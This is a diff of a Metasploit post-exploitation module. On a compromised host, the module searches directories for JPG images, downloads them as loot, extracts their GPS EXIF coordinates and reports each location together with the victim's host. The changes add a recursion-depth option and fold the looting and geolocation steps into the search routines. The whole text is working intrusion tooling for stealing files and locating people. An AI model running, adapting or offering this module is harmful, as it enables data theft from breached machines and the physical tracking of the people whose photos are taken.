@@ -23,7 +23,10 @@ class Metasploit3 < Msf::Post
 				'SessionTypes'  => [ 'meterpreter', 'shell' ]
 			))
 
-		register_options([OptString.new('PATH', [true, 'Directory to search', nil])],
+		register_options([
+                         OptString.new('PATH', [true, 'Directory to search', nil]),
+                         OptInt.new('DEPTH', [true, 'Max directory depth to recurse', 1]),
+                         ],
 			self.class)
 	end
 
@@ -41,25 +44,20 @@ class Metasploit3 < Msf::Post
 		end
 		
 		if gps_found
-            
-            # convert to lat/lon based on n/s & e/w
-			lat = a.exif[0].gps_latitude[0].to_f + (a.exif[0].gps_latitude[1].to_f / 60) + (a.exif[0].gps_latitude[2].to_f / 3600)
-			lon = a.exif[0].gps_longitude[0].to_f + (a.exif[0].gps_longitude[1].to_f / 60) + (a.exif[0].gps_longitude[2].to_f / 3600)
-            
-            lon = lon * -1 if a.exif[0].gps_longitude_ref == "W"
-            lat = lat * -1 if a.exif[0].gps_latitude_ref == "S"
-            
-
+		lat = a.exif[0].gps_latitude[0].to_f + (a.exif[0].gps_latitude[1].to_f / 60) + (a.exif[0].gps_latitude[2].to_f / 3600)
+		lon = a.exif[0].gps_longitude[0].to_f + (a.exif[0].gps_longitude[1].to_f / 60) + (a.exif[0].gps_longitude[2].to_f / 3600)
+		lon = lon * -1 if a.exif[0].gps_longitude_ref == "W"
+		lat = lat * -1 if a.exif[0].gps_latitude_ref == "S"
 			acc=1.0
 			print_status("#{fullpath} contains GPS Exif Data, Lat=#{lat}, Lon=#{lon}")
 			pos = Position.new(lat,lon,acc)            
 			comment = "File: #{fullpath} @ Host: #{session.session_host}"
-			enc_comment = Rex::Text.encode_base64(comment)           
-			report_cresults(pos,"msf_exiffind",enc_comment)
+ 			report_results(pos,"msf_exiffind",comment)
 		end
 	end
 	
-	def loot_jpg(jpg)        
+	def loot_jpg(jpg)
+    
 		if session.type == "meterpreter"
 			sep = session.fs.file.separator
 		else
@@ -74,52 +72,48 @@ class Metasploit3 < Msf::Post
 		return loot_path
 	end
 	
-	def check_jpgs(jpgs)
-		jpgs.each do |jpg|
-			loot_path=loot_jpg(jpg)
-			gps_check(loot_path,jpg)
-		end
-	end
-
 	def nix_shell_search
 		jpgs = []
-		cmd="find #{datastore['path']}/ -iname \"*.jpg\" -type f -print 2>/dev/null"
+        cmd="find #{datastore['path']}/ -iname \"*.jpg\" -maxdepth #{datastore['DEPTH']} -type f -print 2>/dev/null"
 		res = session.shell_command(cmd)
 		res.each_line do |filename|
 			begin
 				jpgs << filename.rstrip
 			end
 		end
-		return jpgs
-	end
-	
-	def meterp_search
-		jpgs = []
-		res = session.fs.file.search(datastore['PATH'], "*.jpg", true, -1)
-		res.each do |filename|
-			begin
-				print_status("Found File #{filename}")
-				jpgs << filename.rstrip
-			end
+        
+        jpgs.each do |jpg|
+            if (jpg!=nil)
+                print_good("Found image: #{jpg.rstrip}")
+                loot_path=loot_jpg(jpg)
+                gps_check(loot_path,jpg)
+            end
 		end
 		return jpgs
 	end
-	
-	def met_scan(path)
-        print_status("Scanning #{path} recursively for JPG images")
+
+
+	def met_scan(path,depth)
+        if (depth > datastore['DEPTH'])
+            return
+        end
         jpgs=[]
+		print_status("Scanning #{path} for JPG images")
 		client.fs.dir.foreach(path) {|x|
 			next if x =~ /^(\.|\.\.)$/
-			fullpath = path + '\\' + x
+                fullpath = path + '\\' + x
 			if client.fs.file.stat(fullpath).directory?
-				jpgs << met_scan(fullpath)
+				jpgs << met_scan(fullpath,depth+1)
 			elsif fullpath =~ /\.jpg/i
-				jpgs << fullpath.rstrip
-                print_good("Found image: #{fullpath.rstrip}")
+                jpgs << fullpath.rstrip
+				print_good("Found image: #{fullpath.rstrip}")
+                loot_path=loot_jpg(fullpath.rstrip)
+                gps_check(loot_path,fullpath.rstrip)
 			end
 		}
 		return jpgs
 	end
+    
 	
 	def session_has_search_ext
 		begin
@@ -131,12 +125,12 @@ class Metasploit3 < Msf::Post
 
 	def run
 		if session_has_search_ext
-			jpgs = met_scan(datastore['PATH'])
+			jpgs = met_scan(datastore['PATH'],1)
 		elsif session.platform =~ /unix|linux|bsd|osx/
 			jpgs = nix_shell_search
 		end
 
-		check_jpgs(jpgs)
+		#check_jpgs(jpgs)
 	end
 
 end
